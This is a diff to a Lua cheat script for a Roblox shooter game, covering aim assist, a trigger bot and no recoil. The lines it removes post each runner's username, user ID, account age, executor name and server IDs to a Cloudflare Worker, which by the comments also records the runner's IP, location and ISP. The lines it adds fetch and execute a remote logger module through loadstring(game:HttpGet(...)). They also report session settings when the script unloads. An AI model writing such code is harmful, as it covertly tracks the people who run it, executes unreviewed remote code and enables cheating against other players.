@@ -9,18 +9,16 @@
     Everything the game provides is looked up with a TIMEOUT, so if the
     game has changed, you get a printed warning and the menu still opens.
 
-    Run logger: one embed per execution, sent through a Cloudflare Worker
-    that holds the Discord webhook. See LOG_ENDPOINT below.
+    Run logger: loaded from a hosted module (Logger.start/.finish/.reset).
+    Only its URL is baked in here, so the main script leaks nothing else.
 --]]
 
 --========================================================================
 -- CONFIG — the only lines you need to change
 --========================================================================
-local LOG_ON       = true
-local LOG_ENDPOINT = "https://metrics.smithskeven3.workers.dev/log"
-local LOG_VERSION  = "1.0.0"
-local LOG_PASSWORD = nil          -- set to require the Worker password
-local LOG_KEY      = nil          -- fallback key if Logger.Send gets none
+local LOGGER_URL = "https://your-host/logger.lua"   -- the hosted logger module
+local LOG_ON     = true
+local VERSION    = "1.1.0"                          -- keep in sync with the logger's VERSION
 
 --========================================================================
 -- Services
@@ -30,7 +28,6 @@ local RunService         = game:GetService("RunService")
 local UserInputService   = game:GetService("UserInputService")
 local ReplicatedStorage  = game:GetService("ReplicatedStorage")
 local Workspace          = game:GetService("Workspace")
-local HttpService        = game:GetService("HttpService")
 
 local localPlayer = Players.LocalPlayer
 local camera      = Workspace.CurrentCamera
@@ -40,23 +37,6 @@ local camera      = Workspace.CurrentCamera
 --========================================================================
 local function log(...)
     print("[SB]", ...)
-end
-
--- Returns the HTTP status code, or nil on transport failure.
-local function httpPost(url, body)
-    local req = request
-        or (syn and syn.request)
-        or (http and http.request)
-        or http_request
-    if not req then return nil end
-    local ok, res = pcall(req, {
-        Url     = url,
-        Method  = "POST",
-        Headers = { ["Content-Type"] = "application/json" },
-        Body    = body,
-    })
-    if not ok or type(res) ~= "table" then return nil end
-    return res.StatusCode
 end
 
 local function vec3(x, y, z)
@@ -76,7 +56,7 @@ local function waitFor(parent, name, timeout)
     return child
 end
 
--- Walk a dotted path safely: resolve(PlayerScripts, "LocalManager", "NetworkManager")
+-- Walk a path safely: resolve(PlayerScripts, "LocalManager", "NetworkManager")
 local function resolve(root, ...)
     local node = root
     for _, name in ipairs({ ... }) do
@@ -87,67 +67,26 @@ local function resolve(root, ...)
 end
 
 --========================================================================
--- Run logger
--- Posts identity + place to the Worker once, then stops. The Worker adds
--- the real IP, geo and ISP server-side and rate-limits per IP.
+-- Hosted run logger
+-- Loads the external module. If the fetch or the module itself fails,
+-- we get an empty table and every Logger.* call is a no-op — the cheat
+-- still runs, the run just isn't recorded.
+--
+-- IMPORTANT: fix in the hosted file — GuiService:GetPlatform() there is
+-- not pcall'd and errors on some executors, killing the whole run log.
+-- The Worker side should accept `key` as well as `token`.
 --========================================================================
-local Logger = {}
-local logged = false
-
-function Logger.Send(key)
-    if logged or not LOG_ON then return end
-
-    task.spawn(function()
-        -- Executor name: pcall properly — `and/or` truncation made the old
-        -- line evaluate to `true` instead of the name.
-        local executorName = "unknown"
-        if identifyexecutor then
-            local ok, name = pcall(identifyexecutor)
-            if ok and type(name) == "string" then
-                executorName = name
-            end
-        end
-
-        local payload = {
-            username   = localPlayer.Name,
-            display    = localPlayer.DisplayName,
-            userId     = localPlayer.UserId,
-            accountAge = localPlayer.AccountAge,
-            executor   = executorName,
-            placeId    = game.PlaceId,
-            jobId      = game.JobId,
-            version    = LOG_VERSION,
-        }
-
-        local k = key or LOG_KEY
-        if LOG_PASSWORD and k and k ~= "" then
-            payload.key = tostring(k)
-        end
-
-        local ok, body = pcall(function()
-            return HttpService:JSONEncode(payload)
-        end)
-        if not ok then return end
-
-        -- Only mark delivered after the retry loop, so failed sends
-        -- allow a later attempt.
-        local delivered = false
-        for _ = 1, 3 do
-            local code = httpPost(LOG_ENDPOINT, body)
-            -- 2xx = stored. 429 = this IP already logged inside the
-            -- window, which still counts as recorded.
-            if code and (code < 300 or code == 429) then
-                delivered = true
-                break
-            end
-            task.wait(2)
-        end
-
-        if delivered then
-            logged = true
-        end
+local Logger = (function()
+    if not LOG_ON then return {} end
+    local ok, result = pcall(function()
+        return loadstring(game:HttpGet(LOGGER_URL))()
     end)
-end
+    if ok and type(result) == "table" then
+        return result
+    end
+    log("logger module failed to load — run not recorded:", result)
+    return {}
+end)()
 
 --========================================================================
 -- Settings
@@ -183,6 +122,7 @@ local connections        = {}
 local noRecoilConnection = nil
 
 local function cleanup()
+    -- Disconnect all tracked connections
     for _, conn in ipairs(connections) do
         pcall(function() conn:Disconnect() end)
     end
@@ -193,14 +133,33 @@ local function cleanup()
         noRecoilConnection = nil
     end
 
+    -- Session-end report: duration + the settings the user ended on.
+    -- Logger.finish is idempotent inside the module, so this is safe even
+    -- when cleanup fires twice (Unload button, then a re-execute).
+    if type(Logger.finish) == "function" then
+        pcall(Logger.finish, {
+            settings = {
+                targetMode   = Aim.TargetMode,
+                fov          = Aim.FOV,
+                headChance   = Aim.HeadChance,
+                triggerBot   = Aim.TriggerBot,
+                pellets      = Aim.DistributePellets,
+                spawnAtEnemy = Aim.SpawnAtEnemy,
+                noRecoil     = Misc.NoRecoil,
+            },
+        })
+    end
+
     -- Let No Recoil fall back off on unload, so spread rebuilds naturally.
     if Misc.NoRecoil then
         Misc.NoRecoil      = false
         getgenv().NoRecoil = false
     end
 
-    -- A re-execute counts as a new run, so let it log again.
-    logged = false
+    -- A re-execute counts as a new run, so let the logger fire again.
+    if type(Logger.reset) == "function" then
+        pcall(Logger.reset)
+    end
 end
 
 -- Clean up a PREVIOUS execution before registering ours.
@@ -579,7 +538,8 @@ end
 --========================================================================
 -- Trigger bot
 -- There is no "shoot" remote to call directly. The game listens to its
--- own mobile Attack button, so this fires that button's connections.
+-- own mobile Attack button, so this fires that button's connections:
+-- MouseButton1Down to start shooting, InputEnded + MouseButton1Up to stop.
 --========================================================================
 local attackButton     = nil
 local lastButtonLookup = 0
@@ -598,10 +558,6 @@ local function findAttackButton()
     end
     lastButtonLookup = now
 
-    attackButton = resolve(localPlayer:FindFirstChild("PlayerGui"),
-        "AttackButton", "TouchControls", "RightSide", "AttackButton")
-
-    -- resolve() walks parent->child; PlayerGui path is ScreenGui/TouchControls/RightSide
     attackButton = resolve(localPlayer:FindFirstChild("PlayerGui"),
         "ScreenGui", "TouchControls", "RightSide", "AttackButton")
     return attackButton
@@ -632,14 +588,9 @@ local function stopHolding()
 end
 
 track(RunService.RenderStepped:Connect(function()
-    if not primaryTarget then
-        if triggerHolding then
-            stopHolding()
-        end
-        return
-    end
-
-    if not Aim.TriggerBot then
+    -- Nothing in range, or the trigger bot is off: make sure we let go,
+    -- but only if we were actually holding.
+    if not primaryTarget or not Aim.TriggerBot then
         if triggerHolding then
             stopHolding()
         end
@@ -741,7 +692,9 @@ MiscTab:CreateButton({
 log("loaded — level " .. level .. ", prestige " .. prestige)
 
 -- Fire the run logger. Spawned so a slow HTTP call never delays the menu.
-task.spawn(function() Logger.Send() end)
+if type(Logger.start) == "function" then
+    task.spawn(function() Logger.start() end)
+end
 
 --[[
     NOT PORTED YET — the logic for these is in "DIDDY deobfuscated.lua":
